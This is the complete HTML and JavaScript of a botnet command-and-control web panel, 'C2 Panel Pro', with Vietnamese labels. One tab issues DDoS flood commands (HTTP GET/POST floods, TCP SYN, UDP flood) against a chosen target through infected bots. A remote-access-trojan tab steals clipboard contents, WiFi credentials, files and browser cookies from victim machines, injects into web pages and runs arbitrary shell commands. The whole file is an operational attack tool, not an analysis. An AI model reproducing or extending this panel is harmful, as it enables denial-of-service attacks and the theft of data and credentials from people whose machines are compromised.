<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>C2 Panel Pro</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>body{background:#0a0a0f;color:#ccc;font-size:13px}.navbar{background:#111!important;border-bottom:2px solid #dc3545}.card{background:#111118;border:1px solid#1e1e2a}.card-header{background:#0a0a14;border-bottom:1px solid#1e1e2a;color:#dc3545;font-weight:bold}.table-dark{--bs-table-bg:#0a0a0f}.btn-danger{background:#dc3545;border:none}.btn-success{background:#198754}.btn-info{background:#0dcaf0;color:#000}.btn-warning{background:#ffc107;color:#000}.sidebar{min-height:calc(100vh-56px);background:#0d0d14;border-right:1px solid#1e1e2a}.bot-item{cursor:pointer;padding:8px 12px;border-left:3px solid transparent;margin:2px 0}.bot-item:hover{background:#1a1a25}.bot-item.online{border-left-color:#198754}.bot-item.attacking{border-left-color:#dc3545}.bot-item.selected{background:#1a1a30;border:1px solid#0dcaf0}.log-box{height:400px;overflow-y:auto;background:#000;font-family:Consolas;font-size:11px;padding:10px;color:#0f0}.log-line{padding:1px 0}.log-cmd{color:#ffc107}.log-ok{color:#0f0}.log-err{color:#f00}</style></head><body>
<nav class="navbar navbar-dark"><div class="container-fluid"><span class="navbar-brand">☠️ C2 PANEL PRO</span><span class="text-muted" id="botCount">Bot: 0 | Online: 0</span></div></nav>
<div class="container-fluid"><div class="row">
<div class="col-md-2 sidebar p-2"><h6 class="text-danger">🤖 BOTS</h6><input class="form-control form-control-sm bg-dark text-light mb-2" placeholder="Search..." id="searchBot"><div id="botList"></div></div>
<div class="col-md-10 p-3">
<ul class="nav nav-tabs" id="mainTab"><li class="nav-item"><a class="nav-link active text-danger" data-bs-toggle="tab" href="#tabAttack">⚔️ Tấn Công</a></li><li class="nav-item"><a class="nav-link text-info" data-bs-toggle="tab" href="#tabRAT">🐀 RAT</a></li><li class="nav-item"><a class="nav-link text-warning" data-bs-toggle="tab" href="#tabLogs">📋 Logs</a></li></ul>
<div class="tab-content mt-2">
<div class="tab-pane active" id="tabAttack"><div class="card"><div class="card-header">Gửi Lệnh Tấn Công</div><div class="card-body"><div class="row g-2"><div class="col-md-4"><label class="small">Mục Tiêu</label><input class="form-control form-control-sm bg-dark text-light" id="target" placeholder="URL hoặc IP:Port"></div><div class="col-md-2"><label class="small">Method</label><select class="form-select form-select-sm bg-dark text-light" id="method"><option>apflood</option><option>GET_FLOOD</option><option>POST_FLOOD</option><option>TCP_SYN</option><option>UDP_FLOOD</option></select></div><div class="col-md-1"><label class="small">Luồng</label><input class="form-control form-control-sm bg-dark text-light" id="threads" value="100"></div><div class="col-md-1"><label class="small">Time(s)</label><input class="form-control form-control-sm bg-dark text-light" id="duration" value="60"></div><div class="col-md-2"><label class="small">Proxy File</label><input class="form-control form-control-sm bg-dark text-light" id="proxyFile" placeholder="proxy.txt"></div><div class="col-md-2 d-flex align-items-end"><button class="btn btn-danger btn-sm w-100" onclick="attack('ALL')">🔥 Tấn Công ALL</button><button class="btn btn-info btn-sm w-100 mt-1" onclick="attack('SELECTED')">🎯 Bot Đã Chọn</button><button class="btn btn-success btn-sm w-100 mt-1" onclick="stop('ALL')">⏹ Dừng</button></div></div></div></div></div>
<div class="tab-pane" id="tabRAT"><div class="card"><div class="card-header">Remote Access Trojan</div><div class="card-body"><div class="row g-2"><div class="col-md-2"><label class="small">Chọn Bot</label><select class="form-select form-select-sm bg-dark text-light" id="ratBot"></select></div><div class="col-md-8 d-flex align-items-end flex-wrap gap-1"><button class="btn btn-info btn-sm" onclick="rat('clipboard')">📋 Clipboard</button><button class="btn btn-info btn-sm" onclick="rat('wifi')">📶 WiFi</button><button class="btn btn-info btn-sm" onclick="rat('sysinfo')">💻 SysInfo</button><button class="btn btn-info btn-sm" onclick="rat('files')">📁 Files</button><button class="btn btn-info btn-sm" onclick="rat('cookies')">🍪 Cookies</button><button class="btn btn-warning btn-sm" onclick="rat('inject_rat')">💉 Inject Web</button><button class="btn btn-danger btn-sm" onclick="rat('cmd')">💻 CMD</button></div><div class="col-md-2"><input class="form-control form-control-sm bg-dark text-light" id="ratParam" placeholder="Lệnh CMD..."></div></div><div class="mt-2"><label class="small">Kết Quả</label><select class="form-select form-select-sm bg-dark text-light w-auto d-inline" id="ratType"><option value="clipboard">Clipboard</option><option value="wifi">WiFi</option><option value="sysinfo">SysInfo</option><option value="files">Files</option><option value="cookies">Cookies</option><option value="cmd_result">CMD Result</option></select><button class="btn btn-info btn-sm" onclick="loadRatData()">🔄 Tải</button><a class="btn btn-success btn-sm" id="ratDownload" href="#" download>📥 Tải TXT</a><pre class="bg-dark text-success p-2 mt-1" style="max-height:300px;overflow-y:auto;font-size:11px" id="ratData"></pre></div></div></div></div>
<div class="tab-pane" id="tabLogs"><div class="log-box" id="logBox"></div></div>
</div></div></div></div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
const API='/api';let bots={},selectedBot=null,token=localStorage.getItem('token')||'';
async function api(method,url,body){let h={'Content-Type':'application/json'};if(token)h['Authorization']='Bearer '+token;let r=await fetch(url,{method,headers:h,body:body?JSON.stringify(body):null});return r.json()}
function log(msg,c){let b=document.getElementById('logBox');b.innerHTML+=`<div class="log-line ${c||''}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;b.scrollTop=b.scrollHeight}
async function login(){let u=prompt('User:'),p=prompt('Pass:');let r=await api('POST',API+'/login',{u,p});if(r.ok){token=r.token;localStorage.setItem('token',token);log('Login OK','log-ok')}else alert('Sai!')}
async function refreshBots(){let r=await api('GET',API+'/bots');if(r.error)return;bots=r;let c=document.getElementById('botList'),h='',on=0,at=0;let sorted=Object.entries(bots).sort((a,b)=>(a[1].hostname||'').localeCompare(b[1].hostname||''));for(let[id,b]of sorted){if(!b.online)continue;on++;if(b.status==='ATTACKING')at++;let cl=b.status==='ATTACKING'?'attacking':'online',sl=selectedBot===id?' selected':'';h+=`<div class="bot-item ${cl}${sl}" onclick="selectBot('${id}')"><b>${b.hostname||id.slice(0,8)}</b><br><small>${b.status} | CPU:${b.cpu||0}% | RAM:${b.ram||0}%</small></div>`}c.innerHTML=h||'<span class="text-muted">Chưa có bot</span>';document.getElementById('botCount').textContent=`Bot: ${on} | Online: ${on} | Attack: ${at}`;let rs=document.getElementById('ratBot');rs.innerHTML='<option value="">--Chọn--</option>';for(let id in bots)if(bots[id].online)rs.innerHTML+=`<option value="${id}">${bots[id].hostname||id}</option>`}
function selectBot(id){selectedBot=id;document.querySelectorAll('.bot-item').forEach(e=>e.classList.remove('selected'));event.target.closest('.bot-item').classList.add('selected')}
async function attack(target){let b=target==='ALL'?'ALL':selectedBot;if(!b){alert('Chọn bot!');return}let d={botId:b,method:document.getElementById('method').value,target:document.getElementById('target').value,threads:document.getElementById('threads').value,duration:document.getElementById('duration').value,proxyFile:document.getElementById('proxyFile').value};await api('POST',API+'/attack',d);log(`🚀 ${d.method} → ${d.target} [${b}]`,'log-cmd')}
async function stop(target){let b=target==='ALL'?'ALL':selectedBot;await api('POST',API+'/stop',{botId:b});log(`⏹ Stop [${b}]`,'log-ok')}
async function rat(action){let b=document.getElementById('ratBot').value;if(!b){alert('Chọn bot!');return}let p=action==='cmd'?document.getElementById('ratParam').value:'';if(action==='cmd'&&!p){alert('Nhập lệnh!');return}await api('POST',API+'/rat',{botId:b,action,params:p});log(`🐀 ${action} → ${b}`,'log-cmd');setTimeout(loadRatData,3000)}
async function loadRatData(){let b=document.getElementById('ratBot').value,t=document.getElementById('ratType').value;if(!b)return;let r=await api('GET',API+'/downloadinfo/'+b);document.getElementById('ratData').textContent=r.error||JSON.stringify(r);document.getElementById('ratDownload').href=API+'/downloadinfo/'+b}
if(!token)login();else refreshBots();setInterval(refreshBots,5000);
</script></body></html>
